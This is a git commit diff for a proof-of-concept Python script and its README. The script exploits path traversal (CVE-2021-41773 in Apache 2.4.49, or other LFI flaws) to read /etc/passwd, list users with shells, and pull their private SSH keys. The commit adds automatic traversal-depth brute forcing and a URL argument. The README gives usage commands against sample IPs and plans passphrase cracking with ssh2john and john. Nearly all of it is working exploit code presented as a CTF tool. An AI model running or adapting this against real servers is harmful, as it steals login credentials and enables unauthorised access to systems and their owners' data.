a2b944ca103f70a9441457534c93f594794325f5
olly <ollyschulz@programco.de>
2025-10-21 17:14:12 +0200

    add cli arg for url

--- README.md
+++ README.md
@@ -1,19 +1,49 @@
 Just a small script that searches for users' SSH keys via a path traversal attack.
 It's for everyone who, like me, constantly forgets any key file name other than id_rsa.
 
+
 ## Disclaimer
 This proof of concept (PoC) script is provided for educational and research purposes only.
 Do not use it to target or compromise any systems that you do not own or do not have explicit, written permission to test.
 
 The author assumes no responsibility or liability for any misuse or damage caused by this script.
 
+
+## Program Flow
+It bruteforces the path depth to take (the `../` count).
+Then it parses `/etc/passwd` to extract all users with a shell (only `/bin/bash` and `/bin/sh` for now).
+
+for every user it cycles through common the home directory of the users and all ssh keyfile names.
+
+If it gots a key, it prints it to the terminal.
+
+
+## Debugging
+If you have to debug the http reqeusts, just modify the loglevel to this.
+```python
+logging.basicConfig(level=logging.DEBUG)
+```
+
 ## CVE-2021-41773
 I used the script against Apache 2.4.49 several times in CTFs.
 To check this CVE manually, [this is a great explanation of it](https://www.hackthebox.com/blog/cve-2021-41773-explained).
 
+
+## LFI Vulnerabilities
+It also works against webapps with LFI vulnerabilities that run on linux machines.
+
+## Usage
+for CVE-2021-41773
+`python ssh.py "http://192.168.161.52/cgi-bin/"
+or for other LFIs
+`python ssh.py "http://192.168.161.52/zm/index.php?view=file&path="
+
+
+
+
 ## ToDos
-- [ ] url as cli argument
-- [ ] use usernames directly from /etc/passwd
+- [x] url as cli argument
+- [x] use usernames directly from /etc/passwd
 - [ ] create ssh keyfile after a finding (and chmod 400)
 - [ ] create passphrase hash with ssh2john and output hashcat command to crack it (e.g. `ssh2john id_rsa_anita > anita.hash && john anita.hash --wordlist=/usr/share/wordlists/rockyou.txt`)
 - [ ] fancy terminal colors for a hit
--- ssh.py
+++ ssh.py
@@ -1,14 +1,9 @@
 import requests
+from sys import argv
+import logging
 
-base_url = "http://192.168.221.245:8000"
-
-user_dirs = [
-    "root",
-    "home/miranda",
-    "home/steven",
-    "home/mark",
-    "home/anita",
-]
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 keys = [
     "id_rsa",
@@ -20,8 +15,9 @@ keys = [
 ]
 
 
-def get(url: str):
+def http_get(url: str):
     """this extra step is neede, because requests escapes ../ path travervals. This workaround works like curl --path-as-is."""
+    logging.debug(f"[-] HTTP GET {url}")
     s = requests.Session()
     req = requests.Request(method="get", url=url)
     prep = req.prepare()
@@ -29,16 +25,67 @@ def get(url: str):
     return s.send(prep, verify=False)
 
 
-def main():
-    for key in keys:
-        for user_dir in user_dirs:
-            response = get(
-                f"{base_url}/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/{user_dir}/.ssh/{key}"
-            )
-            print(response.status_code, user_dir, key)
-            if response.ok:
-                print(response.text)
+def get_escape_count(base_url: str, target_file: str) -> int:
+    logging.info("[*] Determining escape count...")
+    for i in range(15):
+        url = f"{base_url}{'.%2e/' * i}{target_file}"
+        logging.info(f"[*] trying {url}")
+        response = http_get(url)
+        if response.status_code == 200 and len(response.text):
+            logging.info(f"[+] Found valid escape count: {i}")
+            return i
+    raise Exception("Could not determine escape count")
+
+
+def get_file(base_url: str, target_file: str, escape_count: int) -> str | None:
+    url = f"{base_url}{'.%2e/' * escape_count}{target_file}"
+    response = http_get(url)
+    if response.ok:
+        return response.text
+    return None
+
+
+def users_from_passwd(
+    passwd_content: str,
+) -> dict[str, str]:  # username: home directory
+    logging.info("[*] Parsing /etc/passwd for users with shell access...")
+    users = {}
+    for line in passwd_content.splitlines():
+        if line:
+            parts = line.split(":")
+            if parts[-1] == "/bin/bash" or parts[-1] == "/bin/sh":
+                users[parts[0]] = parts[-2]
+    logging.info(f"[+] Extracted users: {users}")
+    return users
+
+
+def get_ssh_keys_from_users(base_url: str, users: dict[str, str], escape_count: int):
+    logging.info("[*] Attempting to retrieve SSH keys...")
+    for user, home_dir in users.items():
+        logging.info(f"[*] Trying to extract ssh keys from: {user}")
+        for key in keys:
+            target_file = f"{home_dir[1:]}/.ssh/{key}"
+            key_content = get_file(base_url, target_file, escape_count)
+            if key_content:
+                logging.info(
+                    f"Found SSH key of type {key} for user {user}:\n{key_content}"
+                )
+
+
+def main(base_url: str):
+    escape_count = get_escape_count(base_url, "etc/passwd")
+    passwd_content = get_file(base_url, "etc/passwd", escape_count)
+    if not passwd_content:
+        logging.error("Could not retrieve /etc/passwd")
+        return
+
+    users = users_from_passwd(passwd_content)
+
+    get_ssh_keys_from_users(base_url, users, escape_count)
 
 
 if __name__ == "__main__":
-    main()
+    if len(argv) > 1:
+        main(argv[1])
+    else:
+        logging.error("Usage: python ssh.py <base_url>")
